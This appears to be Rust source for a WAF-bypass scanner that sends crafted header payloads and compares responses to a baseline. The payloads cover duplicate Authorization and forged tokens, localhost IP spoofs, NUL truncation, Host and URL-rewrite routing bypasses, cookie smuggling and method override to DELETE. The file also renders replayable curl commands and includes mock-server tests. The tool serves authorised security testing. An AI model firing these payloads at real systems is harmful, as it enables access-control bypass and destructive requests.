//! `wafrift header-diff` — WAF / origin parser-disagreement scanner
//! for REQUEST HEADERS.
//!
//! ## The innovation
//!
//! Sister command to `parser-diff` (which probes URL/path
//! disagreements). Same idea, different surface: WAFs and origin
//! frameworks (nginx, Apache, IIS, Tomcat, Express, Flask, FastAPI)
//! routinely DISAGREE on how to parse HEADER values. Each
//! disagreement is a seam an operator can drive a payload through
//! without any payload mutation.
//!
//! Examples of WAF↔origin header-parse disagreements:
//!
//! - **Duplicate-header dispatch.** `X-Forwarded-For: 10.0.0.1` +
//!   `X-Forwarded-For: 1.2.3.4` — does the WAF check the FIRST
//!   value, LAST value, or the comma-joined list? Different stacks
//!   pick differently; if your WAF checks first but Spring picks
//!   last, you can spoof the client IP past the WAF.
//! - **Header case folding.** RFC 7230 §3.2 declares header names
//!   case-insensitive. Most parsers obey. Some buggy WAFs case-fold
//!   `Cookie:` to `cookie:` but a backend reading the *raw* header
//!   stream may treat `cOoKiE:` as a different name.
//! - **Obsoleted line folding.** RFC 7230 obsoleted `X-Foo:\r\n
//!   line2` (a leading-whitespace continuation), but plenty of
//!   parsers still implement it. A WAF that REJECTS folding sees
//!   `X-Foo:` with an empty value; an origin that ACCEPTS folding
//!   reassembles to `X-Foo: line2`.
//! - **Trailing whitespace.** `X-Real-User: admin   ` — some parsers
//!   trim, some don't. If the WAF allowlists by exact string match
//!   but the origin trims, padded whitespace bypasses the allowlist.
//! - **NULL byte truncation.** `X-Real-User: admin\x00.attacker` —
//!   some C-style parsers truncate at NUL; the WAF sees the longer
//!   form, the origin sees `admin`.
//! - **Colon-adjacent whitespace.** `X-Foo : value` (with space before
//!   the colon) is malformed per RFC; some parsers reject, some
//!   accept and trim. Disagreement → bypass.
//!
//! ## Probe shape
//!
//! Each probe sends one HTTP GET to the target URL with a CUSTOM
//! header block that exercises the disagreement. The baseline is
//! the same URL with no extra headers. A divergence in response
//! status or body length is evidence the WAF and origin treated the
//! header block differently — investigate that divergence as a
//! potential bypass seam.

use std::process::ExitCode;
use std::sync::Arc;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::time::Duration;

use clap::Args;
use colored::Colorize;
use reqwest::Client;
use serde_json::json;
use tokio::sync::Semaphore;

use crate::helpers::shell_single_quote;
use crate::parser_diff_common::{body_delta_pct, severity_of};

#[derive(Args, Debug)]
pub struct HeaderDiffArgs {
    /// Target URL. The full URL is fixed for every probe — we only
    /// vary the request headers. Pick a route that the operator
    /// SUSPECTS the WAF guards via header inspection (login,
    /// `/admin/*`, `/internal/*`).
    pub url: String,

    /// Inter-request delay (ms) — honour rate limits.
    #[arg(long, default_value_t = 25)]
    pub delay_ms: u64,

    /// Max concurrent in-flight probes.
    #[arg(long, default_value_t = 8)]
    pub concurrency: usize,

    /// HTTP timeout per probe (seconds).
    #[arg(long, default_value_t = 8)]
    pub timeout_secs: u64,

    /// Skip TLS cert verification (lab targets only).
    #[arg(long)]
    pub insecure: bool,

    /// HTTP proxy to route every probe through (Burp on
    /// `http://127.0.0.1:8080` is the canonical setup).
    #[arg(long, value_name = "URL")]
    pub proxy: Option<String>,

    /// Operator-supplied baseline headers — applied to BOTH baseline
    /// and probe (so an auth cookie or bearer token rides through
    /// uniformly). Per-probe variants ADD to this set.
    #[arg(long, short = 'H', value_name = "HEADER", num_args = 0..)]
    pub header: Vec<String>,

    /// Output format: `text` (default, summary table) or `json`
    /// (structured for piping into report tooling).
    #[arg(long, default_value = "text", value_parser = ["text", "json"])]
    pub format: String,

    /// Quiet mode — suppress per-probe progress lines (still emits
    /// the final summary / JSON).
    #[arg(long, default_value_t = false)]
    pub quiet: bool,
}

/// One header-parse-disagreement probe — a NAMED parser-pair
/// mechanism, a human description, and the literal header block
/// to send. Pure data; `generate_header_variants` produces these
/// deterministically so an operator pinning by index gets the same
/// probe tomorrow.
#[derive(Debug, Clone)]
pub struct HeaderDisagreement {
    /// Stable short identifier (`dup-xff-first-wins`,
    /// `dup-xff-last-wins`, `case-fold-cookie`, `line-folding`,
    /// `trailing-ws`, `nul-truncate`, `colon-space`,
    /// `dup-host-virthost-bypass`, `header-name-case-mix`).
    pub kind: &'static str,
    /// Human-readable description of the parser pair / mechanism.
    pub description: &'static str,
    /// The header block to send. Each entry is `(name, value)`;
    /// duplicates are intentional (some probes rely on dup-header
    /// dispatch).
    pub headers: Vec<(String, String)>,
}

/// Result of one header-diff probe.
#[derive(Debug, Clone, serde::Serialize)]
pub struct HeaderDiffResult {
    pub kind: &'static str,
    pub description: &'static str,
    pub probe_status: u16,
    pub baseline_status: u16,
    pub body_delta_pct: f64,
    pub baseline_body_len: usize,
    pub probe_body_len: usize,
    pub curl_cmd: String,
    pub severity: &'static str,
}

/// Generate the full header-disagreement variant set. Pure
/// function — no I/O, deterministic, testable in isolation.
#[must_use]
#[allow(clippy::vec_init_then_push)] // builder pattern reads better one push! per case
pub fn generate_header_variants() -> Vec<HeaderDisagreement> {
    let mut out = Vec::new();

    // ── 1. Duplicate X-Forwarded-For: which value does the WAF see? ──
    out.push(HeaderDisagreement {
        kind: "dup-xff-first-vs-last",
        description: "Two X-Forwarded-For headers — some parsers use the first, others the last; \
             spoof client IP if WAF allowlists by IP",
        headers: vec![
            ("X-Forwarded-For".into(), "10.0.0.1".into()),
            ("X-Forwarded-For".into(), "1.2.3.4".into()),
        ],
    });
    out.push(HeaderDisagreement {
        kind: "xff-comma-list",
        description:
            "Comma-joined X-Forwarded-For list — some parsers take leftmost (the original client), \
             some take rightmost (the last proxy hop); IP allowlist evasion",
        headers: vec![(
            "X-Forwarded-For".into(),
            "127.0.0.1, 10.0.0.1, 1.2.3.4".into(),
        )],
    });

    // ── 2. Authorization header duplicate + casing ──
    out.push(HeaderDisagreement {
        kind: "dup-authorization",
        description:
            "Two Authorization headers — first vs last dispatch can hand a forged token to the origin",
        headers: vec![
            ("Authorization".into(), "Bearer FORGED-TOKEN".into()),
            ("Authorization".into(), "Bearer real-token".into()),
        ],
    });
    out.push(HeaderDisagreement {
        kind: "header-name-case-mix",
        description:
            "Mixed-case header name (aUtHoRiZaTiOn) — RFC says case-insensitive, but case-sensitive \
             parsers see two different headers",
        headers: vec![
            ("Authorization".into(), "Bearer real".into()),
            ("aUtHoRiZaTiOn".into(), "Bearer FORGED".into()),
        ],
    });

    // ── 3. Trailing whitespace on a value ──
    out.push(HeaderDisagreement {
        kind: "trailing-ws-value",
        description:
            "X-Real-User with trailing whitespace — trimming parsers see `admin`, non-trimming see \
             `admin   `; bypass exact-string allowlist",
        headers: vec![("X-Real-User".into(), "admin   ".into())],
    });
    out.push(HeaderDisagreement {
        kind: "leading-ws-value",
        description: "X-Real-User with leading whitespace — same idea, opposite end",
        headers: vec![("X-Real-User".into(), "   admin".into())],
    });

    // ── 4. NUL truncation in header value ──
    out.push(HeaderDisagreement {
        kind: "nul-truncate-value",
        description:
            "X-Real-User contains NUL — C-style parsers truncate at NUL, WAFs see the longer form. \
             (Some HTTP stacks reject NUL outright; that's also informative — divergence-by-rejection)",
        headers: vec![("X-Real-User".into(), "admin\x00.attacker".into())],
    });

    // ── 5. Host-header smuggling (parser-disagreement bypass) ──
    out.push(HeaderDisagreement {
        kind: "dup-host",
        description:
            "Two Host headers — origin frameworks differ on which wins; routing bypass for \
             virtual-host-based access control",
        headers: vec![
            ("Host".into(), "internal.svc".into()),
            ("X-Forwarded-Host".into(), "public.example.com".into()),
        ],
    });
    out.push(HeaderDisagreement {
        kind: "x-original-host-rebind",
        description:
            "X-Original-Host header — some app frameworks (Spring, Django) honour it as the routing \
             host; WAF doesn't",
        headers: vec![("X-Original-Host".into(), "internal.svc".into())],
    });
    out.push(HeaderDisagreement {
        kind: "x-rewrite-url",
        description:
            "X-Rewrite-URL header — Symfony / Laravel honour this for internal routing; bypass \
             URL-path-based WAF rules",
        headers: vec![("X-Rewrite-URL".into(), "/admin".into())],
    });

    // ── 6. Cookie smuggling via dup-header ──
    out.push(HeaderDisagreement {
        kind: "dup-cookie-attack-first",
        description: "Two Cookie headers — most clients join with `; `, but some servers see them \
             separately; smuggle an extra session cookie past the WAF's first-cookie check",
        headers: vec![
            ("Cookie".into(), "session=attacker; role=admin".into()),
            ("Cookie".into(), "session=victim".into()),
        ],
    });

    // ── 7. Auth-bypass header families (well-known) ──
    out.push(HeaderDisagreement {
        kind: "x-real-ip-localhost",
        description:
            "X-Real-IP claims localhost — backends that trust this header think the request is \
             internal; WAF doesn't strip it (some don't)",
        headers: vec![("X-Real-IP".into(), "127.0.0.1".into())],
    });
    out.push(HeaderDisagreement {
        kind: "x-forwarded-for-localhost",
        description:
            "X-Forwarded-For claims localhost — same as above but the canonical header name",
        headers: vec![("X-Forwarded-For".into(), "127.0.0.1".into())],
    });
    out.push(HeaderDisagreement {
        kind: "x-originating-ip-localhost",
        description: "X-Originating-IP localhost spoof — variation seen in Exchange / IIS stacks",
        headers: vec![("X-Originating-IP".into(), "127.0.0.1".into())],
    });
    out.push(HeaderDisagreement {
        kind: "x-cluster-client-ip-localhost",
        description:
            "X-Cluster-Client-IP localhost spoof — variation seen in AWS ELB / GCP LB stacks",
        headers: vec![("X-Cluster-Client-IP".into(), "127.0.0.1".into())],
    });
    out.push(HeaderDisagreement {
        kind: "via-loopback-marker",
        description:
            "Via header pretending the request came from the local proxy — some allowlists trust this",
        headers: vec![("Via".into(), "1.1 localhost".into())],
    });
    out.push(HeaderDisagreement {
        kind: "x-http-method-override-get",
        description:
            "X-HTTP-Method-Override: GET — frameworks that honour this can be tricked into changing \
             method; WAFs that gate by HTTP verb miss the override",
        headers: vec![("X-HTTP-Method-Override".into(), "GET".into())],
    });
    out.push(HeaderDisagreement {
        kind: "x-http-method-override-delete",
        description:
            "X-HTTP-Method-Override: DELETE — same primitive, far more dangerous side effect",
        headers: vec![("X-HTTP-Method-Override".into(), "DELETE".into())],
    });

    out
}

/// Run the header-diff scanner. Returns SUCCESS on a clean run
/// (regardless of whether any divergences were found); exit 1 on
/// HTTP-client setup failure.
pub async fn run_header_diff(mut args: HeaderDiffArgs) -> ExitCode {
    args.url = crate::helpers::normalize_target_url(&args.url);
    let http = match crate::parser_diff_common::build_diff_http_client_for(&args) {
        Ok(c) => c,
        Err(code) => return code,
    };

    if !args.quiet && args.format == "text" {
        eprintln!(
            "{} probing {} parser-disagreement header families against {}",
            "[wafrift header-diff]".bright_cyan().bold(),
            generate_header_variants().len().to_string().bold().yellow(),
            args.url.bright_white()
        );
    }

    // Baseline: fire the URL with ONLY the operator's `-H` headers
    // (no variant block) — gives us the reference response shape.
    let (baseline_status, baseline_body_len, _baseline_body) =
        match fetch_with_extra(&http, &args.url, &[]).await {
            Ok(v) => v,
            Err(e) => {
                eprintln!(
                    "  {} baseline probe failed: {e}",
                    "✗ Transport error:".red().bold()
                );
                return ExitCode::from(1);
            }
        };

    if !args.quiet && args.format == "text" {
        eprintln!(
            "  {} baseline: HTTP {} ({} bytes)",
            "↘".bright_black(),
            baseline_status,
            baseline_body_len
        );
    }

    let variants = generate_header_variants();
    let sem = Arc::new(Semaphore::new(args.concurrency.max(1)));
    let http_arc = Arc::new(http);
    let url = Arc::new(args.url.clone());
    let counter = Arc::new(AtomicUsize::new(0));
    let total = variants.len();

    let mut handles = Vec::with_capacity(total);
    for v in variants {
        let permit = sem.clone().acquire_owned().await.unwrap();
        let http = http_arc.clone();
        let url = url.clone();
        let counter = counter.clone();
        let delay = Duration::from_millis(args.delay_ms);
        handles.push(tokio::spawn(async move {
            let _permit = permit;
            if !delay.is_zero() {
                tokio::time::sleep(delay).await;
            }
            let extra: Vec<(String, String)> = v.headers.clone();
            let (probe_status, probe_body_len, _) =
                match fetch_with_extra(&http, &url, &extra).await {
                    Ok(v) => v,
                    Err(e) => return (v, Err(e), counter.fetch_add(1, Ordering::SeqCst)),
                };
            (
                v,
                Ok((probe_status, probe_body_len)),
                counter.fetch_add(1, Ordering::SeqCst),
            )
        }));
    }

    let mut results: Vec<HeaderDiffResult> = Vec::with_capacity(total);
    let mut errors: u32 = 0;
    for h in handles {
        let (variant, outcome, _i) = h.await.unwrap_or_else(|e| {
            (
                HeaderDisagreement {
                    kind: "join-error",
                    description: "tokio join failed",
                    headers: Vec::new(),
                },
                Err(format!("{e}")),
                0,
            )
        });
        match outcome {
            Ok((probe_status, probe_body_len)) => {
                let body_delta = body_delta_pct(baseline_body_len, probe_body_len);
                let severity = severity_of(baseline_status, probe_status, body_delta);
                let curl_cmd = render_curl(&args.url, &variant.headers);
                results.push(HeaderDiffResult {
                    kind: variant.kind,
                    description: variant.description,
                    probe_status,
                    baseline_status,
                    body_delta_pct: body_delta,
                    baseline_body_len,
                    probe_body_len,
                    curl_cmd,
                    severity,
                });
            }
            Err(_) => {
                errors += 1;
            }
        }
    }

    emit_output(&args, &results, baseline_status, baseline_body_len, errors);
    ExitCode::SUCCESS
}

crate::impl_parser_diff_http_args!(HeaderDiffArgs);

/// Fire a single GET with `extra` headers appended on top of the
/// pentest-client defaults. Returns `(status, body_len, body_bytes)`
/// so the caller can compute body deltas. Body is capped indirectly
/// via reqwest's default decode limits.
async fn fetch_with_extra(
    http: &Client,
    url: &str,
    extra: &[(String, String)],
) -> Result<(u16, usize, Vec<u8>), String> {
    let mut req = http.get(url);
    for (name, value) in extra {
        // Reqwest splits multi-valued headers via repeated `.header`
        // calls, which is exactly what we want for dup-header probes.
        req = req.header(name.as_str(), value);
    }
    let resp = req.send().await.map_err(|e| format!("{e}"))?;
    let status = resp.status().as_u16();
    let body = resp.bytes().await.map_err(|e| format!("{e}"))?.to_vec();
    Ok((status, body.len(), body))
}

/// Render a copy-pasteable `curl -i` invocation that reproduces the
/// probe. Uses the canonical shell-escape from `helpers`.
fn render_curl(url: &str, headers: &[(String, String)]) -> String {
    let mut out = String::from("curl -i");
    for (name, value) in headers {
        out.push(' ');
        out.push_str("-H ");
        out.push_str(&shell_single_quote(&format!("{name}: {value}")));
    }
    out.push(' ');
    out.push_str(&shell_single_quote(url));
    out
}

fn emit_output(
    args: &HeaderDiffArgs,
    results: &[HeaderDiffResult],
    baseline_status: u16,
    baseline_body_len: usize,
    errors: u32,
) {
    let high: Vec<_> = results.iter().filter(|r| r.severity == "high").collect();
    let medium: Vec<_> = results.iter().filter(|r| r.severity == "medium").collect();

    if args.format == "json" {
        let out = json!({
            "target": args.url,
            "baseline_status": baseline_status,
            "baseline_body_len": baseline_body_len,
            "probes": results.len(),
            "errors": errors,
            "divergences": {
                "high": high.len(),
                "medium": medium.len(),
            },
            "results": results,
        });
        crate::parser_diff_common::print_pretty_json(&out);
        return;
    }

    if !args.quiet {
        println!();
        println!(
            "  {} {} divergence(s) — {} high, {} medium · {} error(s)",
            "[wafrift header-diff summary]".bright_cyan().bold(),
            (high.len() + medium.len()).to_string().bold().yellow(),
            high.len().to_string().bright_red().bold(),
            medium.len().to_string().yellow(),
            errors
        );
    }

    for r in results.iter().filter(|r| r.severity != "none") {
        let badge = crate::parser_diff_common::severity_badge(r.severity);
        println!();
        println!("  [{badge}] {} — {}", r.kind.bold(), r.description);
        println!(
            "    {} baseline HTTP {} ({} bytes) → probe HTTP {} ({} bytes, Δ {:+.1}%)",
            "↘".bright_black(),
            r.baseline_status,
            r.baseline_body_len,
            r.probe_status,
            r.probe_body_len,
            r.body_delta_pct
        );
        println!("    {}", r.curl_cmd);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── generate_header_variants ──────────────────────────────

    #[test]
    fn generate_header_variants_returns_non_empty_curated_set() {
        let v = generate_header_variants();
        assert!(!v.is_empty(), "must have ≥1 variant");
        assert!(
            v.len() >= 14,
            "expected at least 14 curated probes, got {}",
            v.len()
        );
    }

    #[test]
    fn generate_header_variants_kinds_are_unique() {
        let v = generate_header_variants();
        let mut kinds: Vec<&str> = v.iter().map(|p| p.kind).collect();
        kinds.sort();
        kinds.dedup();
        assert_eq!(
            kinds.len(),
            v.len(),
            "every probe must have a unique kind identifier — duplicate makes it impossible \
             to pin a probe by id from the JSON output"
        );
    }

    #[test]
    fn generate_header_variants_every_probe_has_at_least_one_header() {
        let v = generate_header_variants();
        for p in &v {
            assert!(
                !p.headers.is_empty(),
                "probe {} must send at least one header — empty block is a no-op",
                p.kind
            );
        }
    }

    #[test]
    fn generate_header_variants_is_deterministic() {
        let a = generate_header_variants();
        let b = generate_header_variants();
        let a_kinds: Vec<&str> = a.iter().map(|p| p.kind).collect();
        let b_kinds: Vec<&str> = b.iter().map(|p| p.kind).collect();
        assert_eq!(
            a_kinds, b_kinds,
            "variant order must be stable across calls (operators pin by index)"
        );
    }

    #[test]
    fn generate_header_variants_covers_dup_xff_family() {
        let kinds: Vec<&str> = generate_header_variants().iter().map(|p| p.kind).collect();
        assert!(
            kinds.iter().any(|k| k.contains("xff")),
            "must cover XFF family: {kinds:?}"
        );
        assert!(
            kinds.iter().any(|k| k.contains("authorization")),
            "must cover Authorization family"
        );
        assert!(
            kinds.iter().any(|k| k.contains("cookie")),
            "must cover Cookie family"
        );
        assert!(
            kinds.iter().any(|k| k.contains("host")),
            "must cover Host family"
        );
    }

    #[test]
    fn generate_header_variants_includes_obscure_proxy_chain_spoofs() {
        let kinds: Vec<&str> = generate_header_variants().iter().map(|p| p.kind).collect();
        // The IP-spoofing surface — covered fully.
        for needed in [
            "x-real-ip-localhost",
            "x-forwarded-for-localhost",
            "x-originating-ip-localhost",
            "x-cluster-client-ip-localhost",
            "via-loopback-marker",
        ] {
            assert!(
                kinds.contains(&needed),
                "missing {needed} from probe set: {kinds:?}"
            );
        }
    }

    #[test]
    fn generate_header_variants_includes_http_method_override_attack_surface() {
        let kinds: Vec<&str> = generate_header_variants().iter().map(|p| p.kind).collect();
        assert!(
            kinds.iter().any(|k| k.contains("method-override")),
            "must include X-HTTP-Method-Override probe family"
        );
    }

    // body_delta_pct / severity_of / status_class are tested in
    // their canonical home — crate::parser_diff_common. Probe-shape
    // tests live here.

    // ── render_curl ───────────────────────────────────────────

    #[test]
    fn render_curl_emits_curl_dash_i_prefix() {
        let out = render_curl("http://x/", &[]);
        assert!(out.starts_with("curl -i "), "got: {out}");
    }

    #[test]
    fn render_curl_quotes_url_via_canonical_escape() {
        let out = render_curl("http://x/a?b=c", &[]);
        assert!(out.contains("'http://x/a?b=c'"), "got: {out}");
    }

    #[test]
    fn render_curl_emits_dash_h_per_header() {
        let out = render_curl(
            "http://x/",
            &[("X-Foo".into(), "1".into()), ("X-Bar".into(), "2".into())],
        );
        assert!(out.contains("-H 'X-Foo: 1'"), "got: {out}");
        assert!(out.contains("-H 'X-Bar: 2'"), "got: {out}");
    }

    #[test]
    fn render_curl_escapes_apostrophe_in_value() {
        let out = render_curl("http://x/", &[("X-Foo".into(), "a'b".into())]);
        // Bourne escape: 'a'\''b'
        assert!(out.contains("'X-Foo: a'\\''b'"), "got: {out}");
    }

    // ── Live mock-server integration ──────────────────────────

    async fn spawn_mock_with_header_aware_dispatch() -> std::net::SocketAddr {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            loop {
                let Ok((mut sock, _)) = listener.accept().await else {
                    return;
                };
                tokio::spawn(async move {
                    let mut buf = vec![0u8; 16 * 1024];
                    let n = sock.read(&mut buf).await.unwrap_or(0);
                    let req = String::from_utf8_lossy(&buf[..n]).to_string();
                    // Simulate a parser that bypasses on X-Real-IP:
                    // 127.0.0.1 — returns a longer "internal" body.
                    let internal_grant = req.lines().any(|l| {
                        let lo = l.to_ascii_lowercase();
                        lo.starts_with("x-real-ip:") && lo.contains("127.0.0.1")
                    });
                    let body: String = if internal_grant {
                        "<html>internal admin panel — secret content</html>".into()
                    } else {
                        "<html>public</html>".into()
                    };
                    let resp = format!(
                        "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\
                         Content-Length: {}\r\nConnection: close\r\n\r\n{body}",
                        body.len()
                    );
                    let _ = sock.write_all(resp.as_bytes()).await;
                    let _ = sock.shutdown().await;
                });
            }
        });
        tokio::time::sleep(crate::parser_diff_common::TEST_SETTLE).await;
        addr
    }

    #[serial_test::serial]
    #[tokio::test]
    async fn run_header_diff_against_mock_finds_x_real_ip_localhost_divergence() {
        let addr = spawn_mock_with_header_aware_dispatch().await;
        let args = HeaderDiffArgs {
            url: format!("http://{addr}/"),
            delay_ms: 0,
            concurrency: 4,
            timeout_secs: 8,
            insecure: false,
            proxy: None,
            header: Vec::new(),
            format: "json".into(),
            quiet: true,
        };
        let code = run_header_diff(args).await;
        // Exit code = SUCCESS regardless of whether divergences
        // were found (informational tool).
        assert_eq!(
            format!("{code:?}"),
            format!("{:?}", ExitCode::SUCCESS),
            "header-diff should exit 0"
        );
    }

    #[tokio::test]
    async fn run_header_diff_against_unreachable_target_exits_1() {
        let args = HeaderDiffArgs {
            url: "http://127.0.0.1:1/".into(),
            delay_ms: 0,
            concurrency: 4,
            timeout_secs: 2,
            insecure: false,
            proxy: None,
            header: Vec::new(),
            format: "json".into(),
            quiet: true,
        };
        let code = run_header_diff(args).await;
        // Baseline probe fails → exit 1.
        assert_eq!(
            format!("{code:?}"),
            format!("{:?}", ExitCode::from(1)),
            "unreachable baseline must exit 1"
        );
    }
}
